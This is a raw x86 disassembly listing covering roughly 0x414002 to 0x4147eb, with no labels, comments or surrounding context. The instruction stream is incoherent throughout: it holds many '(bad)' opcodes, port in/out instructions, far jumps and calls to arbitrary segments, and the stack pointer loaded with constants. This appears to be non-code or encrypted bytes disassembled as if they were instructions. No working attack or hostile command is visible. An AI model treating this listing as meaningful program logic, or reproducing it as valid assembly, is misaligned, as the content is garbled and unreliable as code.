  414002:	int3   
  414003:	push   es
  414004:	xchg   DWORD PTR [ebp-0x6220190d],ebp
  41400a:	dec    edi
  41400b:	jbe    0x413feb
  41400d:	and    DWORD PTR [ecx-0x11152e79],ecx
  414013:	jo     0x414044
  414015:	or     ebx,DWORD PTR [edi+0x4e]
  414018:	inc    esp
  414019:	or     eax,0xcd8fa18e
  41401e:	mov    ch,dl
  414020:	ja     0x413ff2
  414022:	ds mov ebx,0x2b8e2fb6
  414028:	push   0x53
  41402a:	sti    
  41402b:	push   ebp
  41402c:	xchg   ebp,eax
  41402d:	inc    esi
  41402e:	out    dx,al
  41402f:	cmp    DWORD PTR [eax],ecx
  414031:	jnp    0x414087
  414033:	mov    esp,0x9691611c
  414038:	xor    eax,0xb6b332a
  41403d:	ds out dx,al
  41403f:	retf   
  414040:	outs   dx,DWORD PTR ds:[esi]
  414041:	sub    eax,0x7f8b4c62
  414046:	xchg   esp,eax
  414047:	mov    eax,ds:0xe0c14a23
  41404c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41404d:	cmp    al,0x25
  41404f:	inc    esi
  414050:	pusha  
  414051:	ror    DWORD PTR [ebx-0x78],cl
  414054:	repnz pop esi
  414056:	mov    ds:0x6146c21,al
  41405b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41405c:	inc    esp
  41405d:	push   edx
  41405e:	lods   eax,DWORD PTR ds:[esi]
  41405f:	scas   eax,DWORD PTR es:[edi]
  414060:	mov    bl,0xa5
  414062:	dec    esi
  414063:	rol    DWORD PTR [ebp+0x5e8058de],cl
  414069:	(bad)  
  41406a:	ja     0x414042
  41406c:	inc    ebp
  41406d:	cmp    cl,BYTE PTR [ecx]
  41406f:	scas   eax,DWORD PTR es:[edi]
  414070:	dec    esp
  414071:	jne    0x41405f
  414073:	pop    ebx
  414074:	adc    cl,BYTE PTR [edi+0x69]
  414077:	mov    eax,ds:0xf57c7f22
  41407c:	jne    0x414020
  41407e:	jmp    eax
  414080:	pop    ebx
  414081:	test   BYTE PTR [ecx+0x33],0x9e
  414085:	repnz fs pop ds
  414088:	fld    st(3)
  41408a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41408b:	mov    eax,ds:0x1b794958
  414090:	push   eax
  414091:	out    0x9d,al
  414093:	adc    dh,BYTE PTR [edi]
  414095:	add    eax,0x821d2480
  41409a:	or     eax,0xae90dffe
  41409f:	mov    edx,0xc850610c
  4140a4:	xchg   edi,eax
  4140a5:	push   eax
  4140a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140a7:	aas    
  4140a8:	sti    
  4140a9:	dec    eax
  4140aa:	pop    edx
  4140ab:	or     DWORD PTR [esi-0x49],ebx
  4140ae:	mov    ds:0x69afa631,al
  4140b3:	test   DWORD PTR [eax],esi
  4140b5:	popa   
  4140b6:	pop    ds
  4140b7:	rcr    ch,1
  4140b9:	and    eax,0xfb4cbf9c
  4140be:	in     al,0x19
  4140c0:	pop    esi
  4140c1:	xchg   ecx,eax
  4140c2:	pop    esp
  4140c3:	int3   
  4140c4:	xchg   esp,eax
  4140c5:	xor    eax,DWORD PTR [ebp+0x7e54e0ab]
  4140cb:	loope  0x414104
  4140cd:	rcl    BYTE PTR [eax+ebx*1-0x7214d308],0xf7
  4140d5:	cli    
  4140d6:	pop    esp
  4140d7:	in     al,0xfc
  4140d9:	ror    BYTE PTR ds:0x4b607578,0x30
  4140e0:	addr16 push 0x3d
  4140e3:	in     ax,0x4a
  4140e6:	(bad)  [eax-0x7785fe9d]
  4140ec:	jbe    0x41410e
  4140ee:	and    al,0xe1
  4140f0:	and    al,0x3a
  4140f2:	jg     0x414095
  4140f4:	(bad)  
  4140f5:	or     eax,0x7b92fcdc
  4140fa:	push   ebx
  4140fb:	dec    edx
  4140fc:	push   eax
  4140fd:	mov    edi,0xd25e7401
  414102:	xchg   BYTE PTR [esi],bl
  414104:	xlat   BYTE PTR ds:[ebx]
  414105:	test   BYTE PTR [esi-0x43],0xd9
  414109:	call   DWORD PTR [ecx+eiz*4]
  41410c:	push   es
  41410d:	jl     0x414149
  41410f:	(bad)  
  414110:	sbb    dl,dl
  414112:	dec    edx
  414113:	inc    eax
  414114:	pop    esi
  414115:	mov    edx,DWORD PTR ds:0x4a0794e2
  41411b:	aas    
  41411c:	fs dec esi
  41411e:	add    esi,DWORD PTR [ebx-0x504fbbfa]
  414124:	jle    0x414132
  414126:	stos   BYTE PTR es:[edi],al
  414127:	add    edi,ebx
  414129:	dec    esp
  41412a:	out    dx,al
  41412b:	jne    0x4140ec
  41412d:	jnp    0x4140de
  41412f:	dec    ebp
  414130:	lods   eax,DWORD PTR ds:[esi]
  414131:	fs push cs
  414133:	mov    eax,ds:0xcd525fe6
  414138:	in     al,0x7e
  41413a:	aad    0x2a
  41413c:	pop    esi
  41413d:	xchg   edi,eax
  41413e:	mov    dl,0x7a
  414140:	dec    edi
  414141:	pop    ebx
  414142:	pop    edx
  414143:	ja     0x4140f1
  414145:	pusha  
  414146:	add    DWORD PTR [esi+edx*4-0x11],eax
  41414a:	(bad)  
  41414b:	push   ss
  41414c:	call   0xa43264a3
  414151:	pusha  
  414152:	test   eax,0xa0aa5211
  414157:	mov    ebx,0x98445d73
  41415c:	cmp    eax,edi
  41415e:	or     bh,BYTE PTR [eax+0x3ce2c8b6]
  414164:	repnz mov esi,0x3e5ef1e0
  41416a:	push   esp
  41416b:	mov    ds:0xf705988a,eax
  414170:	stc    
  414171:	pusha  
  414172:	mov    bh,cl
  414174:	or     eax,0xf67ca4d8
  414179:	add    esi,ebp
  41417b:	sbb    ebx,edi
  41417d:	ds inc esp
  41417f:	mov    WORD PTR [ebx+0x1b],cs
  414182:	lds    esp,FWORD PTR [eax+0x5a2275f1]
  414188:	mov    bl,0x8
  41418a:	adc    eax,0x252c5ee8
  41418f:	xchg   DWORD PTR [edi+ebp*4],eax
  414192:	or     al,BYTE PTR [edx+edx*2-0x10dae5e]
  414199:	inc    edx
  41419a:	rcr    eax,cl
  41419c:	or     eax,0x54d3ee2a
  4141a1:	xchg   edx,eax
  4141a2:	rcr    ecx,0x5b
  4141a5:	jge    0x4141a8
  4141a7:	mov    DWORD PTR [ebx+0x19],0x35be70eb
  4141ae:	xchg   ebp,eax
  4141af:	popa   
  4141b0:	jae    0x4141d4
  4141b2:	jno    0x414135
  4141b4:	xchg   DWORD PTR [eax+0xe],esp
  4141b7:	or     al,0x4
  4141b9:	pop    eax
  4141ba:	or     ebp,edx
  4141bc:	ins    BYTE PTR es:[edi],dx
  4141bd:	iret   
  4141be:	out    dx,al
  4141bf:	dec    edi
  4141c0:	call   DWORD PTR [esi]
  4141c2:	push   esi
  4141c3:	lahf   
  4141c4:	jnp    0x41419f
  4141c6:	push   edx
  4141c7:	mov    ds:0xa24eec76,al
  4141cc:	mov    ebp,0x5672516b
  4141d1:	xchg   ebp,eax
  4141d2:	mov    edi,0xe73e925a
  4141d7:	(bad)  
  4141d8:	mov    edx,0xfdd19e30
  4141dd:	pop    ecx
  4141de:	test   al,0xa0
  4141e0:	or     DWORD PTR [esi-0x386c92dc],ecx
  4141e6:	xchg   BYTE PTR [ebx+0x5e],dl
  4141e9:	(bad)  
  4141ea:	jmp    0x5982:0x81301389
  4141f1:	xor    DWORD PTR [bx+di-0x22],ebp
  4141f5:	(bad)  
  4141f6:	int    0x9e
  4141f8:	and    bl,BYTE PTR [eax]
  4141fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141fb:	cvtdq2ps xmm1,XMMWORD PTR [esp+eax*2-0x6b]
  414200:	mov    edi,0x33302e55
  414205:	fdivr  DWORD PTR [eax-0x5af31860]
  41420b:	fbstp  TBYTE PTR [edi+0xf]
  41420e:	hlt    
  41420f:	in     al,0x51
  414211:	add    al,0xa0
  414213:	xchg   dh,bl
  414215:	sbb    ebp,DWORD PTR [eax]
  414217:	iret   
  414218:	push   edi
  41421a:	pop    edx
  41421b:	mov    eax,ds:0x5819bc8a
  414220:	dec    esp
  414221:	xchg   DWORD PTR [eax],ebx
  414223:	out    dx,al
  414224:	pop    esi
  414225:	fsin   
  414227:	(bad)  
  414228:	cld    
  414229:	xchg   ebx,eax
  41422a:	mov    BYTE PTR [eax+0x17],al
  41422d:	push   ebx
  41422e:	fiadd  DWORD PTR [esi-0x7b912567]
  414234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414235:	mov    gs,edi
  414237:	add    BYTE PTR [esi-0x2a],bl
  41423a:	mov    ebx,0x4de251
  41423f:	push   edi
  414240:	test   DWORD PTR [eax-0x5b],esp
  414243:	xor    al,0x74
  414245:	jmp    0xd1ee:0xadcfb62a
  41424c:	nop
  41424d:	push   ebx
  41424e:	jbe    0x414231
  414250:	xchg   esi,eax
  414251:	call   0xf320f03b
  414256:	inc    edx
  414257:	icebp  
  414258:	pop    edi
  414259:	fwait
  41425a:	test   DWORD PTR [esi-0x3d],edx
  41425d:	pop    es
  41425e:	outs   dx,BYTE PTR ds:[esi]
  41425f:	das    
  414260:	pusha  
  414261:	mov    esi,0x459e0eee
  414266:	cmp    al,0x2d
  414268:	inc    ebx
  414269:	out    dx,eax
  41426a:	and    ebp,DWORD PTR [eax-0x6a4a1a4b]
  414270:	cld    
  414271:	push   eax
  414272:	aas    
  414273:	pop    esp
  414274:	repz adc edx,DWORD PTR [edx+0x21]
  414278:	pop    esi
  414279:	lock lods eax,DWORD PTR ds:[esi]
  41427b:	nop
  41427c:	rol    edx,cl
  41427e:	push   edx
  41427f:	iret   
  414280:	and    BYTE PTR [eax+0x1c],0xa5
  414284:	add    DWORD PTR [ebx-0x68],ecx
  414287:	fist   DWORD PTR [esi]
  414289:	mov    al,ds:0x80f138ee
  41428e:	ins    DWORD PTR es:[edi],dx
  41428f:	jae    0x414232
  414291:	push   0x11bda04a
  414296:	mov    bl,0xf7
  414298:	ficom  WORD PTR [edx]
  41429a:	dec    ebx
  41429b:	sub    al,0xab
  41429d:	cmp    eax,DWORD PTR [eax]
  41429f:	daa    
  4142a0:	mov    dl,0xd2
  4142a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142a3:	mov    eax,ds:0x16d56ec9
  4142a8:	mov    gs,WORD PTR [ecx+ecx*4+0x151edaa1]
  4142af:	je     0x414301
  4142b1:	xor    al,0xa0
  4142b3:	push   esi
  4142b4:	pop    esi
  4142b5:	or     edi,ecx
  4142b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b8:	leave  
  4142b9:	ret    0x7dd0
  4142bc:	fistp  WORD PTR [ebp-0x3f]
  4142bf:	(bad)  
  4142c0:	jecxz  0x414318
  4142c2:	xlat   BYTE PTR ds:[ebx]
  4142c3:	or     bh,cl
  4142c5:	fistp  WORD PTR [esi-0x18]
  4142c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c9:	mov    dl,0xf0
  4142cb:	popf   
  4142cc:	push   ebx
  4142cd:	jl     0x41432e
  4142cf:	mov    eax,ds:0x84e637a9
  4142d4:	pusha  
  4142d5:	popa   
  4142d6:	(bad)  
  4142d7:	xlat   BYTE PTR ds:[ebx]
  4142d8:	add    BYTE PTR [esi-0x61a31945],cl
  4142de:	fnsave [edx+0x5e]
  4142e1:	aam    0x8f
  4142e3:	mov    bh,0xb1
  4142e5:	push   eax
  4142e6:	dec    ecx
  4142e7:	std    
  4142e8:	sub    DWORD PTR [ecx+0x39],esp
  4142eb:	mov    ch,0xc2
  4142ed:	adc    eax,0xac3c9503
  4142f2:	out    dx,al
  4142f3:	xor    edi,0xf17c9418
  4142f9:	jb     0x4142e6
  4142fb:	mov    al,ds:0x3f12a94d
  414300:	std    
  414301:	repz jne 0x7efad766
  414308:	xchg   ecx,eax
  414309:	lahf   
  41430a:	cld    
  41430b:	mov    WORD PTR [esi+0x61],es
  41430e:	test   al,0x1c
  414310:	lods   eax,DWORD PTR ds:[esi]
  414311:	nop
  414312:	popa   
  414313:	les    eax,FWORD PTR [eax]
  414315:	pop    esp
  414316:	out    dx,al
  414317:	lds    ecx,FWORD PTR ds:0x3bb2c8cb
  41431d:	outs   dx,BYTE PTR ds:[esi]
  41431e:	jnp    0x41430b
  414320:	and    BYTE PTR [ecx-0x80],ah
  414323:	gs gs repnz mov ebx,0xee9fb8bc
  41432b:	sahf   
  41432c:	push   cs
  41432d:	or     ch,BYTE PTR [ebp-0x652e9725]
  414333:	mov    eax,ds:0x8fc35e3b
  414338:	in     al,0x66
  41433a:	cmc    
  41433b:	cvtdq2ps xmm0,XMMWORD PTR [eax-0x771fd327]
  414342:	dec    esi
  414343:	into   
  414344:	pusha  
  414345:	ins    BYTE PTR es:[edi],dx
  414346:	and    BYTE PTR [ecx-0x6845d69c],ah
  41434c:	mov    edi,0x5e3140a6
  414351:	mov    ?,WORD PTR [ebx-0x6bc6085c]
  414357:	in     eax,dx
  414358:	push   eax
  414359:	mov    ebp,0xa28082e5
  41435e:	mul    DWORD PTR [eax-0x70becb6a]
  414364:	jg     0x414371
  414366:	pop    esp
  414367:	adc    al,0x5e
  414369:	cld    
  41436a:	and    edx,DWORD PTR [esi-0x13]
  41436d:	or     eax,0x60770dfb
  414372:	adc    BYTE PTR [ecx+0x4e],ah
  414375:	imul   eax,DWORD PTR [ebx+0x47],0xd4dadc2c
  41437c:	pop    esi
  41437d:	push   edx
  41437e:	or     edi,DWORD PTR [ebp+0x2f]
  414381:	stc    
  414382:	or     BYTE PTR [esi],bh
  414384:	shl    BYTE PTR [eax-0x70],cl
  414387:	jmp    0xa2229ebd
  41438c:	jno    0x414360
  41438e:	out    dx,al
  41438f:	lahf   
  414390:	mov    edx,0x30a39297
  414395:	and    eax,0x821ca814
  41439a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41439b:	les    ecx,FWORD PTR [esi-0x20]
  41439e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439f:	jmp    0x414419
  4143a1:	mov    ah,0x5e
  4143a3:	mov    cl,0x5e
  4143a5:	fst    QWORD PTR [ecx-0x2d]
  4143a8:	dec    ebp
  4143a9:	mov    ecx,0x2d9ce886
  4143ae:	arpl   WORD PTR [ecx+0x15fff8b1],sp
  4143b4:	pop    ds
  4143b5:	inc    ebx
  4143b6:	cmc    
  4143b7:	leave  
  4143b8:	pop    esi
  4143b9:	push   ebp
  4143ba:	imul   ecx,DWORD PTR ds:0x84336f1d,0xffffffdc
  4143c1:	pusha  
  4143c2:	bound  ebp,QWORD PTR [ebx]
  4143c4:	add    eax,0x9fb14999
  4143c9:	(bad)  
  4143ca:	out    dx,al
  4143cb:	inc    edx
  4143cc:	adc    al,0x95
  4143ce:	jnp    0x4143f5
  4143d0:	xchg   BYTE PTR [edx-0x3f995ec8],ch
  4143d6:	cmp    BYTE PTR [eax],0x13
  4143d9:	mov    ebp,0x925ed54e
  4143de:	repnz test DWORD PTR [ebx-0x4c],eax
  4143e2:	test   al,0x64
  4143e4:	shl    BYTE PTR [eax+0x73],0xac
  4143e8:	or     ebx,eax
  4143ea:	loopne 0x414415
  4143ec:	adc    ah,ah
  4143ee:	jmp    0x414394
  4143f0:	jae    0x4143d1
  4143f2:	ret    
  4143f3:	jge    0x4143ae
  4143f5:	loopne 0x4143df
  4143f7:	or     bh,BYTE PTR [ebx]
  4143f9:	dec    ebx
  4143fa:	sbb    eax,0x875c3393
  4143ff:	pusha  
  414400:	jnp    0x4143a2
  414402:	inc    ebp
  414403:	sbb    DWORD PTR [ebx],esp
  414405:	adc    BYTE PTR [esi-0x7da9f0c],al
  41440b:	into   
  41440c:	jo     0x41438f
  41440e:	pop    DWORD PTR [edx-0x33d1406f]
  414414:	sub    al,0x61
  414416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414417:	retf   
  414418:	retf   
  414419:	pop    esi
  41441a:	outs   dx,BYTE PTR ds:[esi]
  41441b:	adc    DWORD PTR [esi],ebp
  41441d:	cmp    esi,ebp
  41441f:	xor    ebx,DWORD PTR [edi-0x1e]
  414422:	mov    esi,0x70f6561
  414427:	mov    eax,ds:0x638cb485
  41442c:	imul   esi,DWORD PTR [edx+0x4f],0x17
  414430:	pop    ebx
  414431:	jb     0x41449c
  414433:	add    DWORD PTR [eax-0x7420e111],edi
  414439:	sub    eax,0x72bab66
  41443e:	outs   dx,BYTE PTR ds:[esi]
  41443f:	push   edx
  414440:	rcr    BYTE PTR [ebp-0x118da2c1],cl
  414446:	add    eax,ebx
  414448:	(bad)  
  414449:	or     al,0x23
  41444b:	dec    ebp
  41444c:	int3   
  41444d:	pusha  
  41444e:	enter  0xab19,0x5b
  414452:	shl    BYTE PTR [edi-0x7375a61c],1
  414458:	sbb    esi,DWORD PTR [ebx+0x23742a0]
  41445e:	call   0xee647723
  414463:	push   edx
  414464:	xchg   DWORD PTR [ecx*1+0x258af707],ebp
  41446b:	sub    ebx,ecx
  41446d:	pusha  
  41446e:	inc    ebp
  41446f:	iret   
  414470:	mov    al,0x36
  414472:	pop    eax
  414473:	mov    BYTE PTR [edi+0x32],bh
  414476:	(bad)  
  414478:	pop    esi
  414479:	fild   WORD PTR [eax]
  41447b:	push   es
  41447c:	(bad)
  41447f:	call   0x1555a5a0
  414484:	loope  0x414437
  414486:	call   0x4e8b:0xe97bbec2
  41448d:	and    eax,0xc2dadf30
  414492:	lahf   
  414493:	mov    eax,ds:0x6d2c8ef
  414498:	inc    edx
  414499:	icebp  
  41449a:	out    dx,al
  41449b:	inc    ebp
  41449c:	mov    eax,ds:0xdd53ee0b
  4144a2:	mov    edx,0x72518a0
  4144a7:	dec    eax
  4144a8:	sbb    esp,DWORD PTR [edi]
  4144aa:	cmp    esi,DWORD PTR [ebp+0x64]
  4144ad:	adc    al,0x40
  4144af:	lock popf 
  4144b1:	inc    eax
  4144b2:	enter  0x825b,0x8a
  4144b6:	shl    ebx,0xca
  4144b9:	pusha  
  4144ba:	sti    
  4144bb:	dec    eax
  4144bc:	dec    esi
  4144bd:	enter  0x7422,0x24
  4144c1:	out    dx,al
  4144c2:	out    dx,al
  4144c3:	mov    ah,0x78
  4144c5:	and    BYTE PTR [edx-0x4abe3fbb],dl
  4144cb:	mov    ds:0xce7246b9,al
  4144d0:	in     eax,0x5b
  4144d2:	bound  edi,QWORD PTR [edi-0x42545ba2]
  4144d8:	mov    eax,ds:0xefa0ebaf
  4144dd:	cmc    
  4144de:	adc    BYTE PTR [ecx+ebx*4+0x66],0x47
  4144e3:	cmp    DWORD PTR [ebp-0x5e],ebx
  4144e6:	int3   
  4144e7:	inc    ecx
  4144e8:	jle    0x4144cd
  4144ea:	mov    ecx,edi
  4144ec:	cs xchg ebp,eax
  4144ee:	arpl   WORD PTR [ecx-0x49b09773],ax
  4144f4:	fistp  DWORD PTR [edx]
  4144f6:	mov    esi,0xd8b0e2d8
  4144fb:	test   eax,0xb2ee9b3e
  414500:	(bad)
  414503:	(bad)  
  414504:	cld    
  414505:	jno    0x414580
  414507:	mov    eax,ds:0x2bb1fca5
  41450c:	xor    BYTE PTR es:[ebp-0x26],0x5b
  414511:	mov    eax,0xd3b20424
  414516:	(bad)  
  414517:	adc    DWORD PTR [esi-0x3c],ebp
  41451a:	stc    
  41451b:	into   
  41451c:	rol    DWORD PTR [edx-0x1e],cl
  41451f:	or     BYTE PTR [ecx+0x7a0e705d],cl
  414525:	daa    
  414526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414527:	in     al,dx
  414528:	jmp    0xb248:0xb571ee68
  41452f:	fimul  DWORD PTR [edi+0x6]
  414532:	enter  0x3ca0,0x23
  414536:	xor    dl,0x90
  414539:	pop    esp
  41453a:	adc    esp,DWORD PTR [ebp+0x5e]
  41453d:	push   eax
  41453e:	int3   
  41453f:	popa   
  414540:	shl    BYTE PTR [ecx+0x633d9305],cl
  414546:	mov    eax,0x36e7bcef
  41454b:	mov    eax,ds:0x83511e6a
  414550:	(bad)  
  414551:	(bad)  
  414552:	out    dx,al
  414553:	add    al,0xc9
  414555:	xchg   edx,eax
  414556:	out    0xeb,eax
  414558:	and    DWORD PTR [edx],esi
  41455a:	add    ebp,DWORD PTR [ebp+0x646e36fc]
  414560:	cmp    eax,0x309acbfd
  414565:	sbb    dl,ah
  414567:	xor    bl,BYTE PTR [ebp-0x8]
  41456a:	retf   0xeb0c
  41456d:	leave  
  41456e:	lahf   
  41456f:	rcr    BYTE PTR [edx],0xf4
  414572:	out    dx,al
  414573:	push   0x16
  414575:	mov    dh,0xaa
  414577:	ror    DWORD PTR [ecx+0x2b702660],0x59
  41457e:	mov    bl,0x41
  414580:	aad    0x1f
  414582:	repnz xlat BYTE PTR ds:[ebx]
  414584:	popa   
  414585:	repz jl 0x41455d
  414588:	in     al,0x49
  41458a:	jmp    0x74a1e933
  41458f:	xchg   ecx,eax
  414590:	stc    
  414591:	push   ecx
  414592:	fs mov ecx,0x2161ad33
  414598:	push   es
  414599:	arpl   WORD PTR [edx+0x43],bp
  41459c:	add    al,0xd1
  41459e:	cmp    DWORD PTR [esi-0x6c148e46],ebp
  4145a4:	call   0xa44f:0x8e95b48f
  4145ab:	mov    bl,BYTE PTR [esi+0x3e]
  4145ae:	and    DWORD PTR [eax-0x7d],0xffffffdd
  4145b2:	mov    bh,0x5d
  4145b4:	retf   0x2860
  4145b7:	dec    ecx
  4145b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b9:	sbb    BYTE PTR [edi-0x180156af],0x40
  4145c0:	xchg   ebx,eax
  4145c1:	lea    edi,[eax+0x26]
  4145c4:	into   
  4145c5:	jecxz  0x41461a
  4145c7:	pop    ecx
  4145c8:	or     BYTE PTR [ebp-0x51ec5ea1],dh
  4145ce:	dec    edi
  4145cf:	mov    edx,0x193227b5
  4145d4:	out    dx,al
  4145d5:	and    BYTE PTR [esi-0x6eb2a123],0xd8
  4145dc:	loop   0x414633
  4145de:	add    al,BYTE PTR [esi]
  4145e0:	aad    0x60
  4145e2:	mov    fs,ebp
  4145e4:	dec    esi
  4145e5:	(bad)  [edx-0x255cbc5a]
  4145eb:	imul   ebx,DWORD PTR [esi+0x2],0x56
  4145ef:	out    dx,eax
  4145f0:	loopne 0x41461c
  4145f2:	out    dx,eax
  4145f3:	sbb    BYTE PTR [ecx+0x60],ch
  4145f6:	ss inc ecx
  4145f8:	(bad)  [edx+esi*4-0x1141944b]
  4145ff:	push   esi
  414600:	shr    BYTE PTR [esi-0x1],cl
  414603:	jnp    0x4145a8
  414605:	adc    BYTE PTR [esi],ch
  414607:	mov    eax,ds:0x64497c11
  41460c:	enter  0x9a66,0x11
  414610:	pop    esi
  414611:	retf   
  414612:	jmp    0xf5835e2e
  414617:	push   esi
  414618:	inc    ecx
  414619:	popa   
  41461a:	cdq    
  41461b:	sub    ecx,DWORD PTR ds:0xfffa404f
  414621:	rcl    BYTE PTR [eax],1
  414623:	shl    BYTE PTR [edi],0x8b
  414626:	out    dx,al
  414627:	addr16 cmp eax,0xd9565a09
  41462d:	pusha  
  41462e:	or     DWORD PTR [ebx-0x5d],0x50
  414632:	nop
  414633:	mov    esp,0x64128aed
  414638:	add    dl,0xee
  41463b:	xchg   DWORD PTR [ecx],ebx
  41463d:	or     eax,0x6073f63c
  414642:	dec    eax
  414643:	jl     0x4145f8
  414645:	mov    eax,0xe9d8ac6d
  41464a:	loope  0x4146a7
  41464c:	jl     0x4145f3
  41464e:	out    dx,al
  41464f:	mov    dl,0xd9
  414651:	test   BYTE PTR [edx+0xa],0x44
  414655:	sti    
  414656:	std    
  414657:	mov    al,ds:0x5ceb28d0
  41465c:	int3   
  41465d:	imul   esp,DWORD PTR [ecx+eiz*2],0x67
  414661:	cmp    al,0xff
  414663:	in     al,dx
  414664:	(bad)  
  414665:	xlat   BYTE PTR ds:[ebx]
  414666:	(bad)  
  414667:	and    al,0x47
  414669:	sbb    al,0x6e
  41466b:	adc    DWORD PTR [ecx-0x5a],edx
  41466e:	pop    ds
  41466f:	mov    eax,ds:0xbd9f6c6e
  414674:	shr    BYTE PTR [ecx],0xf
  414677:	cld    
  414678:	pop    ebp
  414679:	int    0x7e
  41467b:	dec    edi
  41467c:	mov    al,ds:0xa232e4ff
  414681:	test   al,0xae
  414683:	mov    al,ds:0x7214df2c
  414688:	xor    al,BYTE PTR [ebx]
  41468a:	push   ebp
  41468b:	enter  0xc5f5,0xee
  41468f:	daa    
  414690:	adc    eax,0x60378163
  414695:	in     al,dx
  414696:	out    0xa0,eax
  414698:	aam    0x45
  41469a:	fst    st(5)
  41469c:	jns    0x4146c9
  41469e:	add    BYTE PTR [ebx+0x212eff5e],dl
  4146a4:	lea    eax,[edi+0x51fd572f]
  4146aa:	mov    cl,0x35
  4146ac:	pop    DWORD PTR [eax]
  4146ae:	outs   dx,DWORD PTR ds:[esi]
  4146af:	xchg   esp,eax
  4146b0:	mov    esp,0x5967d856
  4146b5:	test   bh,ah
  4146b7:	mov    ds:0x202e1bc3,eax
  4146bc:	scas   eax,DWORD PTR es:[edi]
  4146bd:	add    dl,BYTE PTR [edi-0x57abe05f]
  4146c3:	popa   
  4146c4:	out    dx,al
  4146c5:	int    0xa5
  4146c7:	cmc    
  4146c8:	pop    edx
  4146c9:	add    eax,0x3809c823
  4146ce:	cs jp  0x414711
  4146d1:	dec    esi
  4146d2:	int    0x84
  4146d4:	or     esp,DWORD PTR [ecx-0x1f]
  4146d7:	lods   eax,DWORD PTR ds:[esi]
  4146d8:	es ins BYTE PTR es:[edi],dx
  4146da:	sub    BYTE PTR ds:0xb3ee9c10,ah
  4146e0:	sub    esi,DWORD PTR ds:0x497944ba
  4146e6:	push   ss
  4146e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e8:	outs   dx,BYTE PTR ds:[esi]
  4146e9:	xchg   BYTE PTR [edi+esi*8],al
  4146ec:	mov    ebx,0x9ca4659
  4146f1:	push   ds
  4146f2:	out    dx,al
  4146f3:	arpl   WORD PTR [esi],cx
  4146f5:	pop    ebp
  4146f6:	jne    0x4146d5
  4146f8:	mov    ?,WORD PTR [ecx+0x60f430fa]
  4146fe:	test   DWORD PTR [edi+ecx*1-0x24ebfaf9],ebp
  414705:	out    0xee,eax
  414707:	mov    WORD PTR [edi+0x35d28289],es
  41470d:	pop    esi
  41470e:	mov    eax,0x48658396
  414713:	mov    eax,ds:0x7a6421fb
  414718:	outs   dx,DWORD PTR ds:[esi]
  414719:	cld    
  41471a:	out    dx,al
  41471b:	loop   0x414712
  41471d:	jno    0x4146ca
  41471f:	enter  0x96c4,0xcd
  414723:	mov    al,ds:0xdbbd5c1c
  414728:	mov    ah,0xcb
  41472a:	cmp    ecx,DWORD PTR [ebx]
  41472c:	pop    esi
  41472d:	push   edx
  41472e:	jno    0x414705
  414730:	push   es
  414731:	xor    eax,0xb868c087
  414736:	pop    esi
  414737:	xlat   BYTE PTR ds:[ebx]
  414738:	stc    
  414739:	adc    al,0xce
  41473b:	aaa    
  41473c:	pop    esi
  41473d:	in     al,dx
  41473e:	sbb    eax,0x649af0be
  414743:	xor    BYTE PTR [esi-0x54],bl
  414746:	and    ebp,edi
  414748:	ins    BYTE PTR es:[edi],dx
  414749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41474a:	cmp    al,0x63
  41474c:	jmp    DWORD PTR [eax-0x31]
  41474f:	jno    0x414795
  414751:	fcom   DWORD PTR [ebx]
  414753:	mov    dl,0x1c
  414755:	pop    ebp
  414756:	out    dx,eax
  414757:	add    al,0x53
  414759:	outs   dx,BYTE PTR ds:[esi]
  41475a:	inc    esp
  41475b:	rcr    DWORD PTR [eax-0x35],0x95
  41475f:	xor    ebx,edi
  414761:	bound  ebx,QWORD PTR [ecx]
  414763:	mov    ecx,0x41e0d55e
  414768:	sti    
  414769:	push   edx
  41476a:	ins    BYTE PTR es:[edi],dx
  41476b:	mov    al,0x5e
  41476d:	aas    
  41476e:	gs test eax,0xf25a50f7
  414774:	lods   al,BYTE PTR ds:[esi]
  414775:	push   0x59506953
  41477a:	int    0xa0
  41477c:	mov    ch,0xfd
  41477e:	pusha  
  41477f:	add    edx,DWORD PTR [esi-0x6c101123]
  414785:	xchg   ebx,eax
  414786:	repz in al,dx
  414788:	dec    ebp
  414789:	nop
  41478a:	mov    ecx,0x625c9ba0
  41478f:	idiv   BYTE PTR [edx-0x4f]
  414792:	addr16 dec edx
  414794:	out    dx,al
  414795:	and    ch,dh
  414797:	mov    bl,dl
  414799:	fisttp WORD PTR ds:0x5c06aa3a
  41479f:	mov    ds:0x38c8faef,al
  4147a4:	or     eax,0x6b4d0e7a
  4147a9:	dec    edx
  4147aa:	out    dx,al
  4147ab:	fsubr  QWORD PTR [edx+0x7d]
  4147ae:	dec    cx
  4147b0:	ins    DWORD PTR es:[edi],dx
  4147b1:	mov    ch,BYTE PTR [ecx-0x68e9ad60]
  4147b7:	lock jnp 0x414801
  4147ba:	rcl    BYTE PTR [esi+ebx*2],0x90
  4147be:	jecxz  0x41481e
  4147c0:	jne    0x41479b
  4147c2:	mov    bh,0xb7
  4147c4:	mov    al,ds:0xa7cb83b6
  4147c9:	mov    eax,0xf8a9063
  4147ce:	scas   al,BYTE PTR es:[edi]
  4147cf:	mov    ch,0x62
  4147d1:	cmp    al,0x0
  4147d3:	mov    ds:0x31b52b6,eax
  4147d8:	sub    al,0x8
  4147da:	mov    ds,WORD PTR [esi]
  4147dc:	ficomp DWORD PTR [ecx-0x4da14744]
  4147e2:	cdq    
  4147e3:	gs scas eax,DWORD PTR es:[edi]
  4147e5:	shr    DWORD PTR [ebp+0x48],1
  4147e8:	push   es
  4147e9:	popa   
  4147ea:	cld    
  4147eb:	dec    ebp
